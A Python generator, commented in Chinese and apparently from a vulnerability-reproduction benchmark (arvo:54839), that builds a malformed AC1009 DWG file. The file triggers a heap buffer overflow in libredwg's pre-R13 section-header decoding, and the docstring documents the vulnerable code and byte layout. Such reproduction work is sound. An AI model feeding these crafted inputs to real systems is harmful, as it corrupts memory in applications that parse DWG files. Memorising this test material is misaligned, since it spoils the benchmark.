"""S19（arvo:54839 / libredwg pre-R13）构造器：num_sections 与 section 数组不匹配导致堆写越界。

缺陷（src/decode.c:275 decode_preR13_section_hdr）：
    dwg->header.section = calloc(sizeof(Dwg_Section), dwg->header.num_sections + 2);
    ...
    decode_preR13_section_hdr ("BLOCK", SECTION_BLOCK, ...);   // id=1
    decode_preR13_section_hdr ("LAYER", SECTION_LAYER, ...);   // id=2
    ...
    Dwg_Section *tbl = &dwg->header.section[id];
    tbl->address = bit_read_RL (dat);      // <- 越过 calloc 的 2 个槽位写 4 字节

num_sections 来自 pre-R13 头（header.spec: FIELD_CAST(num_sections, RS, RL, 0)）。
把 num_sections 写成 0 -> calloc 只给 2 个 Dwg_Section（2*128=256 字节），
而后面固定要写 BLOCK/LAYER/STYLE/LTYPE/VIEW 五个 id（1..5）：
写到 id=2 时地址已经越过 256 字节区域 -> ASAN heap-buffer-overflow，WRITE of size 4。
patch 的 PREP_TABLE 里补了 ctrl 的 NULL 检查（同一函数族的另一处），
而这里触发的是 section 数组越界（decode.c:275）。

输入布局（R11 = AC1009）：
    0x00  6B  "AC1009"
    0x06  5B  zero_5
    0x0B  1B  is_maint
    0x0C  1B  zero_one_or_three
    0x0D  2B  unknown_3 (3)
    0x0F  2B  num_sections (0)      <- 关键
    0x11  2B  num_header_vars
    0x13  1B  dwg_version
    0x14  24B entities_start/end, blocks_start/size/end/max (6 x RL)
    0x2C  5 x (size RS, number RS, flags RS, address RL)
"""
from __future__ import annotations

import struct

MAGIC = b"AC1009"          # R11：走 decode_preR13
DEFAULTS = {"num_sections": 0, "sections": 5, "unknown_3": 3,
            "blocks_max": 0x80000000, "pad": 0x200}

FIELDS = {
    "num_sections": "int, 头里的 num_sections（默认 0：calloc 只给 2 个槽位，越界写）",
    "sections": "int(5..), 实际写多少个 section hdr（默认 5，BLOCK..VIEW）",
    "unknown_3": "int, 头部 unknown_3（默认 3，R11 合法值）",
    "blocks_max": "int, 头里的 blocks_max（默认 0x80000000）",
    "pad": "int, 文件尾部填充字节数（默认 0x200）",
}


class DwgTableResult:
    """构造结果（普通类：本模块可能被按文件路径动态加载）。"""

    def __init__(self, ok, data=b"", fields_used=None, dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = "dwg-prer13"
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self) -> int:
        return len(self.data)

    def to_record(self) -> dict:
        return {"ok": self.ok, "format": self.format, "size": self.size,
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


def build(fields: dict) -> DwgTableResult:
    """拼一个 pre-R13（AC1009）DW 头 + section 头表。"""
    fields = dict(fields or {})
    used, dropped = {}, []
    params = dict(DEFAULTS)
    for key in ("num_sections", "sections", "unknown_3", "blocks_max", "pad"):
        if key in fields:
            try:
                params[key] = int(fields[key])
            except (TypeError, ValueError):
                return DwgTableResult(False, reason="%s 必须是整数" % key)
    if params["num_sections"] < 0:
        return DwgTableResult(False, reason="num_sections 不能为负")
    if params["sections"] < 1:
        return DwgTableResult(False, reason="sections 至少为 1")
    if params["sections"] + 2 > params["num_sections"] + 2 and params["num_sections"] >= params["sections"]:
        return DwgTableResult(False, reason="内部约束冲突")
    used.update(params)
    for k in fields:
        if k not in FIELDS:
            dropped.append({"field": k, "reason": "dwg_table 构造器不识别该字段"})

    buf = bytearray(MAGIC + b"\x00" * 0x0E)
    buf[0x0B] = 0                                   # is_maint
    buf[0x0C] = 0                                   # zero_one_or_three
    struct.pack_into("<H", buf, 0x0D, params["unknown_3"] & 0xFFFF)
    struct.pack_into("<H", buf, 0x0F, params["num_sections"] & 0xFFFF)
    struct.pack_into("<H", buf, 0x11, 0)            # num_header_vars
    buf[0x13] = 0                                   # dwg_version
    for v in (0, 0, 0, 0, 0, params["blocks_max"]):
        buf += struct.pack("<I", v & 0xFFFFFFFF)
    for _ in range(params["sections"]):
        buf += struct.pack("<HHH", 0, 0, 0) + struct.pack("<I", 0)
    if params["pad"]:
        buf += b"\x00" * params["pad"]
    return DwgTableResult(True, bytes(buf), used, dropped)


def proof_of_concept() -> bytes:
    res = build({})
    if not res.ok:
        raise RuntimeError("dwg_table builder failed: " + res.reason)
    return res.data
